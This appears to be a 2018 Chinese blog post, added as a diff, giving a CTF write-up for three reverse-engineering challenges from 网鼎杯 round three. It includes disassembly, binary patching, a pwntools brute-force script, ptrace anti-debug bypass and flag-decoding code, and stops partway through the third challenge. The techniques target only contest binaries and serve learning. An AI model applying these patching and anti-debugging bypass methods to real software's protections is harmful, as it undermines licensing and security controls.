@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="0x01 babyre.NET逆向，dnSpy打开，点击flag后暂停程序单步执行找到输出flag的点跟入看到Form结构，其中即定义了flag： 0x02 SimpleSMC直接运行输入flag总会报段错误，猜测是中间有对函数解码过程通过strings:”input your flag”很容易定位到判断函数可以看到关键的判断语句： 1234567if ( (unsigned int)((__in">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯第三场_Re">
+<meta property="og:url" content="http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="0x01 babyre.NET逆向，dnSpy打开，点击flag后暂停程序单步执行找到输出flag的点跟入看到Form结构，其中即定义了flag： 0x02 SimpleSMC直接运行输入flag总会报段错误，猜测是中间有对函数解码过程通过strings:”input your flag”很容易定位到判断函数可以看到关键的判断语句： 1234567if ( (unsigned int)((__in">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-9250817dc4270a96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-fa433a41ebc6b562.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-50cb03611fd3e87f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="article:published_time" content="2018-08-28T07:33:27.000Z">
+<meta property="article:modified_time" content="2018-08-28T07:34:12.000Z">
+<meta property="article:author" content="Kirin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Re">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-9250817dc4270a96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>网鼎杯第三场_Re</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/09/13/unlink-Simple-note/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/08/26/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%AC%AC%E4%BA%8C%E5%9C%BA-Re-PWN/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/&text=网鼎杯第三场_Re" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/&title=网鼎杯第三场_Re" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/&is_video=false&description=网鼎杯第三场_Re" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=网鼎杯第三场_Re&body=Check out this article: http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/&title=网鼎杯第三场_Re" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/&title=网鼎杯第三场_Re" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/&title=网鼎杯第三场_Re" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/&title=网鼎杯第三场_Re" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/&name=网鼎杯第三场_Re&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-babyre"><span class="toc-number">1.</span> <span class="toc-text">0x01 babyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-SimpleSMC"><span class="toc-number">2.</span> <span class="toc-text">0x02 SimpleSMC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-I-like-pack"><span class="toc-number">3.</span> <span class="toc-text">0x03 I_like_pack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-SoEasy"><span class="toc-number">4.</span> <span class="toc-text">0x04 SoEasy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-dewas"><span class="toc-number">5.</span> <span class="toc-text">0x05 dewas</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        网鼎杯第三场_Re
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-08-28T07:33:27.000Z" itemprop="datePublished">2018-08-28</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/Re/" rel="tag">Re</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x01-babyre"><a href="#0x01-babyre" class="headerlink" title="0x01 babyre"></a>0x01 babyre</h3><p>.NET逆向，dnSpy打开，点击flag后暂停程序<br>单步执行找到输出flag的点<br>跟入看到Form结构，其中即定义了flag：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-9250817dc4270a96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="flag"></p>
+<h3 id="0x02-SimpleSMC"><a href="#0x02-SimpleSMC" class="headerlink" title="0x02 SimpleSMC"></a>0x02 SimpleSMC</h3><p>直接运行输入flag总会报段错误，猜测是中间有对函数解码过程<br>通过strings:”input your flag”很容易定位到判断函数<br>可以看到关键的判断语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if ( (unsigned int)((__int64 (__fastcall *)(_BYTE *, char *))loc_400BAC)(v5, &amp;v4)</span><br><span class="line">  &amp;&amp; (v0 &#x3D; &amp;v4, (unsigned int)((__int64 (__fastcall *)(char *))loc_400AA6)(&amp;v4)) )</span><br><span class="line">&#123;</span><br><span class="line">  v0 &#x3D; &quot;[*]YOU WIN[*]&quot;;</span><br><span class="line">  sub_410060(&quot;[*]YOU WIN[*]&quot;);</span><br><span class="line">  result &#x3D; 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先看到400BAC有花：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-fa433a41ebc6b562.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>nop掉E8，create function，看到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall sub_400BAC(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  int i; &#x2F;&#x2F; [rsp+Ch] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  for ( i &#x3D; 0; *((_BYTE *)&amp;loc_400AA6 + i) !&#x3D; -61; ++i )</span><br><span class="line">    *((_BYTE *)&amp;loc_400AA6 + i) ^&#x3D; *(_BYTE *)(i % 7 + a1);</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其利用我们输入flag中22~28位（通过传参可以看到）对loc_400AA6进行解码。<br>首先可以在动态调试中断到此处(静态不行，在进入解码之前loc_400AA6会改变)，根据loc_400AA6的开始几个值与”push rbp;mov rbp,rsp”异或得出：”F1@g”<br>后三个暂时没想到其他方法，直接patch掉程序：<br>把：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400D9C                 test    eax, eax</span><br><span class="line">.text:0000000000400D9E                 jz      short loc_400DB1</span><br><span class="line">.text:0000000000400DA0                 mov     edi, offset aYouWin ; &quot;[*]YOU WIN[*]&quot;</span><br></pre></td></tr></table></figure>
+<p>中的判断nop掉，只要flag中解码的7位正确，就会输出YOU WIN，否则段错误(考虑写脚本爆破，如果没有输出，p.recv()接收不到字符也会EOFError，有多组解，最后需要调试看一下)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">ans&#x3D;&quot;&quot;</span><br><span class="line">for i in range(32,127):</span><br><span class="line">  for j in range(32,127):</span><br><span class="line">    for k in range(32,127):</span><br><span class="line">          s&#x3D;&quot;a&quot;*21+&quot;F1@g&quot;+chr(i)+chr(j)+chr(k)</span><br><span class="line">          p&#x3D;process(&quot;.&#x2F;SimpleSMC&quot;)</span><br><span class="line">          p.recvuntil(&quot;flag:\n&quot;)</span><br><span class="line">          p.sendline(s)</span><br><span class="line">          try:</span><br><span class="line">             p.recv()</span><br><span class="line">             print s</span><br><span class="line">             ans&#x3D;ans+s+&quot;   &quot;</span><br><span class="line">          except EOFError:</span><br><span class="line">               p.close()</span><br><span class="line">print ans</span><br></pre></td></tr></table></figure>
+<p>不过这样显然有点失了智(太慢了)，看了队里大佬的wp，可以根据结尾’call __stack_chk_fail;(使用sig找到函数) leave; ret’来解后三字节，解出是”F1@gChe”，而后便是逆400AA6的过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400AD2     call    sub_4009AE</span><br></pre></td></tr></table></figure>
+<p>sub_4009AE:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004009AE push    rbp</span><br><span class="line">.text:00000000004009AF mov     rbp, rsp</span><br><span class="line">.text:00000000004009B2 sub     rsp, 10h</span><br><span class="line">.text:00000000004009B6 mov     [rbp+var_8], rdi</span><br><span class="line">.text:00000000004009BA mov     [rbp+var_C], esi</span><br><span class="line">.text:00000000004009BD mov     [rbp+var_10], edx</span><br><span class="line">.text:00000000004009C0 mov     eax, [rbp+var_C]</span><br><span class="line">.text:00000000004009C3 sar     eax, 1</span><br><span class="line">.text:00000000004009C5 mov     edx, eax</span><br><span class="line">.text:00000000004009C7 mov     rax, [rbp+var_8]</span><br><span class="line">.text:00000000004009CB mov     esi, edx</span><br><span class="line">.text:00000000004009CD mov     rdi, rax</span><br><span class="line">.text:00000000004009D0 mov     eax, 0</span><br><span class="line">.text:00000000004009D5 call    sub_400A18</span><br><span class="line">.text:00000000004009DA cmp     [rbp+var_10], 0</span><br><span class="line">.text:00000000004009DE jz      short loc_4009F9</span><br><span class="line">.text:00000000004009E0 mov     eax, [rbp+var_10]</span><br><span class="line">.text:00000000004009E3 lea     edx, [rax-1]</span><br><span class="line">.text:00000000004009E6 mov     ecx, [rbp+var_C]</span><br><span class="line">.text:00000000004009E9 mov     rax, [rbp+var_8]</span><br><span class="line">.text:00000000004009ED mov     esi, ecx</span><br><span class="line">.text:00000000004009EF mov     rdi, rax</span><br><span class="line">.text:00000000004009F2 call    sub_4009AE</span><br><span class="line">.text:00000000004009F7 jmp     short near ptr loc_400A15+1</span><br><span class="line">.text:00000000004009F9 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004009F9</span><br><span class="line">.text:00000000004009F9 loc_4009F9:                             ; CODE XREF: sub_4009AE+30↑j</span><br><span class="line">.text:00000000004009F9 push    rax</span><br><span class="line">.text:00000000004009FA xor     rax, rax</span><br><span class="line">.text:00000000004009FD jz      short loc_400A03</span><br><span class="line">.text:00000000004009FF add     rsp, 4</span><br><span class="line">.text:0000000000400A03</span><br><span class="line">.text:0000000000400A03 loc_400A03:                             ; CODE XREF: sub_4009AE+4F↑j</span><br><span class="line">.text:0000000000400A03 pop     rax</span><br><span class="line">.text:0000000000400A04 jle     near ptr loc_400A10+1</span><br><span class="line">.text:0000000000400A0A jnz     near ptr loc_400A10+1</span><br><span class="line">.text:0000000000400A10</span><br><span class="line">.text:0000000000400A10 loc_400A10:                             ; CODE XREF: sub_4009AE+56↑j</span><br><span class="line">.text:0000000000400A10                                         ; sub_4009AE+5C↑j</span><br><span class="line">.text:0000000000400A10 call    near ptr loc_400ACA+3</span><br><span class="line">.text:0000000000400A15</span><br><span class="line">.text:0000000000400A15 loc_400A15:                             ; CODE XREF: sub_4009AE+49↑j</span><br><span class="line">.text:0000000000400A15 add     cl, cl</span><br><span class="line">.text:0000000000400A17 retn</span><br></pre></td></tr></table></figure>
+<p>sub_400A18对我们输入进行处理<br>首先调用了一次</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004009CB mov     esi, edx</span><br><span class="line">.text:00000000004009CD mov     rdi, rax</span><br><span class="line">.text:00000000004009D0 mov     eax, 0</span><br><span class="line">.text:00000000004009D5 call    sub_400A18</span><br></pre></td></tr></table></figure>
+<p>而后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004009DA cmp     [rbp+var_10], 0</span><br><span class="line">.text:00000000004009DE jz      short loc_4009F9</span><br><span class="line">.text:00000000004009E0 mov     eax, [rbp+var_10]</span><br><span class="line">.text:00000000004009E3 lea     edx, [rax-1]</span><br><span class="line">.text:00000000004009E6 mov     ecx, [rbp+var_C]</span><br><span class="line">.text:00000000004009E9 mov     rax, [rbp+var_8]</span><br><span class="line">.text:00000000004009ED mov     esi, ecx</span><br><span class="line">.text:00000000004009EF mov     rdi, rax</span><br><span class="line">.text:00000000004009F2 call    sub_4009AE</span><br></pre></td></tr></table></figure>
+<p>通过判断[rbp+var_10]处(0x40，且递减1)，又调用了0x40次call    sub_4009AE，即调用了1+0x40*<br>sub_400A18：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_400A18(__int64 a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  int i; &#x2F;&#x2F; [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( !a2 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  for ( i &#x3D; 0; i &lt; a2; ++i )</span><br><span class="line">    *(_BYTE *)(a2 + i + a1) ^&#x3D; *(_BYTE *)(i + a1);</span><br><span class="line">  return sub_400A18(a1, (unsigned int)(a2 &gt;&gt; 1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>简单的异或逻辑，同时可以看出，每0x8次调用即会抵消<br>所以就相当于调用了1次<br>400AA6最后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400AD7 mov     qword ptr [rbp-30h], 0</span><br><span class="line">.text:0000000000400ADF mov     qword ptr [rbp-28h], 0</span><br><span class="line">.text:0000000000400AE7 mov     qword ptr [rbp-20h], 0</span><br><span class="line">.text:0000000000400AEF mov     qword ptr [rbp-18h], 0</span><br><span class="line">.text:0000000000400AF7 mov     byte ptr [rbp-10h], 0</span><br><span class="line">.text:0000000000400AFB mov     byte ptr [rbp-30h], 66h</span><br><span class="line">.text:0000000000400AFF mov     byte ptr [rbp-2Fh], 0Ah</span><br><span class="line">.text:0000000000400B03 mov     byte ptr [rbp-2Eh], 7</span><br><span class="line">.text:0000000000400B07 mov     byte ptr [rbp-2Dh], 0Bh</span><br><span class="line">.text:0000000000400B0B mov     byte ptr [rbp-2Ch], 1Dh</span><br><span class="line">.text:0000000000400B0F mov     byte ptr [rbp-2Bh], 8</span><br><span class="line">.text:0000000000400B13 mov     byte ptr [rbp-2Ah], 51h</span><br><span class="line">.text:0000000000400B17 mov     byte ptr [rbp-29h], 38h</span><br><span class="line">.text:0000000000400B1B mov     byte ptr [rbp-28h], 1Fh</span><br><span class="line">.text:0000000000400B1F mov     byte ptr [rbp-27h], 5Ch</span><br><span class="line">.text:0000000000400B23 mov     byte ptr [rbp-26h], 14h</span><br><span class="line">.text:0000000000400B27 mov     byte ptr [rbp-25h], 38h</span><br><span class="line">.text:0000000000400B2B mov     byte ptr [rbp-24h], 30h</span><br><span class="line">.text:0000000000400B2F mov     byte ptr [rbp-23h], 0Ah</span><br><span class="line">.text:0000000000400B33 mov     byte ptr [rbp-22h], 1Ah</span><br><span class="line">.text:0000000000400B37 mov     byte ptr [rbp-21h], 28h</span><br><span class="line">.text:0000000000400B3B mov     byte ptr [rbp-20h], 39h</span><br><span class="line">.text:0000000000400B3F mov     byte ptr [rbp-1Fh], 59h</span><br><span class="line">.text:0000000000400B43 mov     byte ptr [rbp-1Eh], 0Ch</span><br><span class="line">.text:0000000000400B47 mov     byte ptr [rbp-1Dh], 24h</span><br><span class="line">.text:0000000000400B4B mov     byte ptr [rbp-1Ch], 24h</span><br><span class="line">.text:0000000000400B4F mov     byte ptr [rbp-1Bh], 22h</span><br><span class="line">.text:0000000000400B53 mov     byte ptr [rbp-1Ah], 1</span><br><span class="line">.text:0000000000400B57 mov     byte ptr [rbp-19h], 1Fh</span><br><span class="line">.text:0000000000400B5B mov     byte ptr [rbp-18h], 1Eh</span><br><span class="line">.text:0000000000400B5F mov     byte ptr [rbp-17h], 73h</span><br><span class="line">.text:0000000000400B63 mov     byte ptr [rbp-16h], 1Dh</span><br><span class="line">.text:0000000000400B67 mov     byte ptr [rbp-15h], 3Ah</span><br><span class="line">.text:0000000000400B6B mov     byte ptr [rbp-14h], 8</span><br><span class="line">.text:0000000000400B6F mov     byte ptr [rbp-13h], 5</span><br><span class="line">.text:0000000000400B73 mov     byte ptr [rbp-12h], 15h</span><br><span class="line">.text:0000000000400B77 mov     byte ptr [rbp-11h], 0Ah</span><br><span class="line">.text:0000000000400B7B mov     rdx, [rbp-38h]</span><br><span class="line">.text:0000000000400B7F lea     rax, [rbp-30h]</span><br><span class="line">.text:0000000000400B83 mov     rsi, rdx</span><br><span class="line">.text:0000000000400B86 mov     rdi, rax</span><br><span class="line">.text:0000000000400B89 call    sub_400360</span><br></pre></td></tr></table></figure>
+<p>即：将我们的输入和定义的字符比对(没用sig，看参数猜测call    sub_400360为strcmp)<br>对应数据逆出flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">key&#x3D;[ 0x66, 0x0A, 0x07, 0x0B, 0x1D, 0x08, 0x51, 0x38, 0x1F, 0x5C,  0x14, 0x38, 0x30, 0x0A, 0x1A, 0x28, 0x39, 0x59, 0x0C, 0x24,  0x24, 0x22, 0x01, 0x1F, 0x1E, 0x73, 0x1D, 0x3A, 0x08, 0x05, 0x15, 0x0A]</span><br><span class="line">def dec(k,b):</span><br><span class="line">	if b&gt;16:</span><br><span class="line">		return 0</span><br><span class="line">	else:</span><br><span class="line">		for i in range(b):</span><br><span class="line">			k[i+b]^&#x3D;k[i]</span><br><span class="line">		return dec(k,b&lt;&lt;1)</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">	dec(key,1)</span><br><span class="line">	print &quot;&quot;.join(chr(i) for i in key)</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-I-like-pack"><a href="#0x03-I-like-pack" class="headerlink" title="0x03 I_like_pack"></a>0x03 I_like_pack</h3><p>赛中没做出来，方向错了<br>复现一下过程：<br>首先，程序短时间自动停止<br>猜测调用了alarm(),并有ptrace</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace  -i .&#x2F;re</span><br></pre></td></tr></table></figure>
+<p>可以发现：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-50cb03611fd3e87f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="strace"><br>在gdb下断到ptrace系统条用处：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">catch syscall ptrace</span><br></pre></td></tr></table></figure>
+<p>查看调用栈：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bt</span><br><span class="line">#0  0x00007ffff7ae8e2e in ?? ()</span><br><span class="line">#1  0x0000000000400a84 in ?? ()</span><br><span class="line">#2  0x00007fffffffcb88 in ?? ()</span><br><span class="line">#3  0x0000000100000000 in ?? ()</span><br><span class="line">#4  0x0000000000000000 in ?? ()</span><br></pre></td></tr></table></figure>
+<p>在0x400a84处下硬件断点<br>动态调试时create function，看到判断函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for ( j &#x3D; 0; j &lt;&#x3D; 35; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  if ( dword_60F0E0[*(&amp;v10 + j)] !&#x3D; v46[j] - 45 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4007D0(&amp;loc_401748);</span><br><span class="line">    sub_4008E0(0LL);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>简单异或逻辑，导出数据逆flag即可：</p>
